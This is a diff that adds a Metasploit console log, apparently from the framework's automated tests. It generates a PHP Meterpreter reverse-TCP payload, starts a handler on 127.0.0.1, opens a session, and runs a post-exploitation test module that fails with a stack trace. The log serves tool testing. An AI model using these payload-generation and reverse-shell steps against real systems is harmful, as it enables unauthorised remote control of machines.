@@ -1,0 +1,21 @@
+use php/meterpreter_reverse_tcp
+msf6 post(test/extapi) > generate -o D:/a/_temp/meterpreter-spec-rb-php-meterpreter-reverse-tcp20220128-6448-15qz6s.php -f raw lport=6027 lhost=127.0.0.1
+msf6 payload(php/meterpreter_reverse_tcp) > [*] Writing 34276 bytes to D:/a/_temp/meterpreter-spec-rb-php-meterpreter-reverse-tcp20220128-6448-15qz6s.php...
+msf6 payload(php/meterpreter_reverse_tcp) > to_handler
+[*] Payload Handler Started as Job 26
+msf6 payload(php/meterpreter_reverse_tcp) > 
+[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
+[*] Started reverse TCP handler on 127.0.0.1:6027 
+[*] Meterpreter session 27 opened (127.0.0.1:6027 -> 127.0.0.1:50086 ) at 2022-01-28 22:40:45 +0000
+use test/file
+msf6 post(test/file) > run session=27 addentropy=true verbose=true
+[*] Setup: changing working directory to %TEMP%
+[-] Post failed: Rex::Post::Meterpreter::RequestError stdapi_fs_chdir: Operation failed: 1
+[-] Call stack:
+[-]   D:/a/metasploit-framework/metasploit-framework/lib/rex/post/meterpreter/extensions/stdapi/fs/dir.rb:189:in `chdir'
+[-]   D:/a/metasploit-framework/metasploit-framework/lib/msf/core/post/file.rb:51:in `cd'
+[-]   D:/a/metasploit-framework/metasploit-framework/test/modules/post/test/file.rb:45:in `setup'
+[*] Cleanup: changing working directory back to D:\a\metasploit-framework\metasploit-framework
+[*] Cleanup: changing working directory back to D:\a\metasploit-framework\metasploit-framework
+[*] Post module execution completed
+msf6 post(test/file) > 
